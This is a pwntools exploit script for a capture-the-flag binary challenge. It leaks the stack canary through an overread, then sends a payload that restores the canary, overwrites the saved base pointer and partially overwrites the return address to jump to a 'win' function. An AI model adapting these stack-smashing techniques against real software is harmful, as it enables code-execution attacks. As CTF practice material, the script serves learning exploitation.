#!/usr/bin/python3 
# RazviOverflow

from pwn import *

context.binary = binary = ELF("./chall", checksec=False)
#context.log_level = "debug"

p = process()
pid = util.proc.pidof(p)
print(f"Pid is: {pid}")
util.proc.wait_for_debugger(pid)


#p = remote("typop.chal.idek.team", 1337)
p.recvuntil(b"survey?\n")
p.sendline(b"y")
p.recvuntil(b"ctf?\n")

padding = b"A"*10

p.sendline(padding)
canary = p.recv()
print(canary)
data = canary.split(b"\n")[1] # This includes everything up to and including "feedback?\n"
canary = data[:7]
original_main_address = data[7:15].ljust(8, b"\x00")
#print(f"original_main_address: {original_main_address}")
#print(f"original_main_address: {hex(u64(original_main_address))}")
# rjust (pad to the left) is used instead of ljust (pad to the right)
# because we want to add a null byte as the least significant byte
# which in little endian is the leftmost byte (adjusting to the right the other ones)
# before unpacking
canary = canary.rjust(8, b"\x00")  
#canary = b"\x00" + canary[1:] # lower byte of the canary is always \x00
print(f"Canary is: {canary} - {hex(u64(canary))}")

payload = padding
payload += canary
payload += b"B"*8 # overwrite RBP itself
payload += b"\x49\xf2" # last 3 bytes of win function (overwritten straigth into memory, must be little endian)

#print(f"Payload: {payload}")

p.send(payload)
print(p.recvall())
p.interactive()
